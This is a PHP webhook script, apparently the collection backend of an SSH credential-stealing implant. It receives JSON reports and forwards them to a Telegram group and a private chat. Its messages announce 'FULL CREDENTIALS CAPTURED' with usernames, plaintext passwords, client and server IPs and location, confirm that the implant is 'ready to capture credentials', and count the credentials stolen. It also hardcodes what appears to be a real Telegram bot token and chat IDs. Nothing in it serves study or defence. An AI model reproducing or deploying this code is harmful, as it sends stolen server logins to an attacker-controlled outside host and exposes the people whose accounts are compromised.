<?php

$bot_token  = getenv('TELEGRAM_BOT_TOKEN') ?: "8160151363:AAHs3wuqiPnk_F1kkdJgy46Ut5NHGKTYqWc";
$group_id   = getenv('TELEGRAM_GROUP_ID') ?: "-5186179713";
$private_id = getenv('TELEGRAM_PRIVATE_ID') ?: "1939940209";

function send_to_telegram($chat_id, $message) {
    global $bot_token;
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function format_full_credentials_message($data) {
    $msg = "🔓 *FULL CREDENTIALS CAPTURED* 🔓\n\n";
    $msg .= "*⚡ SSH LOGIN SUCCESS:*\n";
    $msg .= "• 👤 *Username:* `{$data['username']}`\n";
    $msg .= "• 🔑 *Password:* `{$data['password']}` ⚠️\n";
    $msg .= "• 🌐 *Client IP:* `{$data['client_ip']}`\n";
    $msg .= "• 🖥️ *Server IP:* `{$data['server_ip']}`\n";
    $msg .= "• 🕐 *Time:* `{$data['timestamp']}`\n";
    $msg .= "• 🏷️ *Hostname:* `{$data['hostname']}`\n\n";
    
    if (!empty($data['location_info'])) {
        $msg .= "*📍 Location Info:*\n```\n";
        foreach ((array)$data['location_info'] as $k => $v) { $msg .= "$k: $v\n"; }
        $msg .= "```\n\n";
    }

    $msg .= "*📊 System Status:*\n";
    $msg .= "• Load: `{$data['system_load']}`\n";
    $msg .= "• Memory: `{$data['memory']}`\n";
    $msg .= "• Disk: `{$data['disk_free']}`\n\n";
    $msg .= "✅ *Credential captured*";
    return $msg;
}

function format_installation_success_message($data) {
    return "✅ *MONITOR INSTALLATION SUCCESSFUL* ✅\n\n"
         . "• 🖥️ *Server IP:* `{$data['server_ip']}`\n"
         . "• 🏷️ *Hostname:* `{$data['hostname']}`\n"
         . "• 🕐 *Time:* `{$data['timestamp']}`\n\n"
         . "⚠️ *Ready to capture credentials*";
}

function format_monitor_status_message($data) {
    return "📊 *MONITOR STATUS REPORT* 📊\n\n"
         . "• 🖥️ *Server IP:* `{$data['server_ip']}`\n"
         . "• ⏱️ *Uptime:* `{$data['uptime']}`\n"
         . "• 📈 *Total Logins:* `{$data['total_logins']}`\n"
         . "• 🔑 *Captured:* `{$data['creds_captured']}`\n\n"
         . "✅ *Monitor is functioning normally*";
}

function format_test_alert_message($data) {
    return "🧪 *TEST ALERT - MONITOR WORKING* 🧪\n\n"
         . "• 🖥️ *Server IP:* `{$data['server_ip']}`\n"
         . "• 👤 *User:* `{$data['username']}`\n"
         . "✅ *Webhook to Telegram forwarding is working!*";
}

// --- Main Execution ---

header('Content-Type: application/json');
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['type'])) {
    echo json_encode(['status' => 'error', 'message' => 'No data']);
    exit;
}

$message = "";
switch ($data['type']) {
    case 'full_credentials':     $message = format_full_credentials_message($data); break;
    case 'installation_success': $message = format_installation_success_message($data); break;
    case 'monitor_status':       $message = format_monitor_status_message($data); break;
    case 'test_alert':           $message = format_test_alert_message($data); break;
}

if ($message !== "") {
    send_to_telegram($group_id, $message);
    send_to_telegram($private_id, $message);
    echo json_encode(['status' => 'dispatched']);
} else {
    echo json_encode(['status' => 'ignored']);
}
